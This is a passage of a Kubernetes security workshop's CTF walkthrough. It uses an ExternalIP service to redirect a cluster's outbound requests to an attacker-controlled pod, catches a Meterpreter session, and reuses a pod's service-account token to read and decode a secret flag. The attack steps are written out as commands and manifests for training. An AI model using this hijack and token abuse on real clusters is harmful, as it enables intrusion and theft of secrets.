+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl-davinci <span class="nt">-n</span> ellingson-min create configmap staticinclusionfile <span class="nt">--from-file</span><span class="o">=</span>static-inclusion.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at the configMap:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl-davinci <span class="nt">-n</span> ellingson-min get configmap staticinclusionfile <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's create a pod to serve a replacement <code>static-inclusion.php</code> page out of that configMap:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh"> &gt;pod-serve-static.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: serve-static
+  namespace: ellingson-min
+  labels:
+    app: serve-static
+spec:
+  containers:
+  - name: serve-static
+    image: docker-registry:5000/webserver-without-php
+    volumeMounts:
+    - name: staticinclusion
+      mountPath: /var/www/html/
+  volumes:
+  - name: staticinclusion
+    configMap:
+        name: staticinclusionfile  
+  imagePullSecrets:
+  - name: regcred-docker-registry-5000
+</span><span class="no">END
+</span></code></pre></div></div>
+</li>
+<li>
+<p>Start up the pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl-theplague apply <span class="nt">-f</span> pod-serve-static.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, we're on to step 3. We need to create an ExternalIP service to redirect requests for an external IP back over to our pod. In another tab, look up the IP address for <code>static.containersecurityctf.com</code>.  At the time of this writing, it is <code>147.182.229.202</code>. Go back to your Metasploit tab and put that in a variable:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">staticip</span><span class="o">=</span><span class="s2">"147.182.229.202"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Create a manifest for an external IP service to redirect any outbound traffic from the cluster to <code>static.containersecurityctf.com</code> to a pod we control instead.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh"> &gt;cve.yaml
+apiVersion: v1
+kind: Service
+metadata:
+  name: mitm-cve
+  namespace: ellingson-min
+spec:
+  selector:
+    app: serve-static
+  ports:
+    - name: http
+      protocol: TCP
+      port: 80
+      targetPort: 8000
+  externalIPs:
+    - </span><span class="nv">$staticip</span><span class="sh">
+</span><span class="no">END
+</span></code></pre></div></div>
+</li>
+<li>
+<p>Let's apply our cve.yaml file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl-davinci apply <span class="nt">-f</span> cve.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Finally, we're at step 4. The gibson only requests <code>static-inclusion.php</code> when it gets a request. So, launch a request:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://<span class="nv">$ip</span>/
+</code></pre></div></div>
+</li>
+<li>
+<p>We should find that we're notified of another Meterpreter session. Let's switch to the new session.  First, hit Ctrl-Z to background this Meterpreter channel.</p>
+<pre><code>Hit Ctrl-z
+</code></pre></li>
+<li>
+<p>Next, hit y to confirm.</p>
+<pre><code>Hit y
+</code></pre></li>
+<li>
+<p>Now, tell the Metasploit console that you'd like to background the session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>background
+</code></pre></div></div>
+</li>
+<li>
+<p>Get a list of sesssions:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-l</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Switch to the new session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-i</span> 3
+</code></pre></div></div>
+</li>
+<li>
+<p>Start a shell:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+</li>
+<li>
+<p>Run <code>bash -i</code> to make it more friendly.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>List the <code>/</code> directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at the <code>HINT.txt</code> file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /HINT.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>OK - you've won!</p>
+</li>
+<li>
+<p>Let's use this pod's service account to get a flag. First, set up a kubectl alias:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">tokendir</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/token<span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server="</span>https://kubernetes.default.svc.cluster.local<span class="s2">" </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+-n </span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/namespace<span class="si">)</span><span class="s2">"</span> 
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, get the flag.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secret flag-gibson <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Decode the flag:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl  <span class="nt">-n</span> ellingson-min get secret flag-gibson <span class="nt">-o</span> yaml | <span class="se">\</span>
+<span class="nb">grep </span>flag: | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>The flag looked something like this:</p>
+<pre><code>you-hacked-the-gibson-FLAG-ebcf7d1d-35e8-4e7a-a547-c9a5e364d5ee
+</code></pre></li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
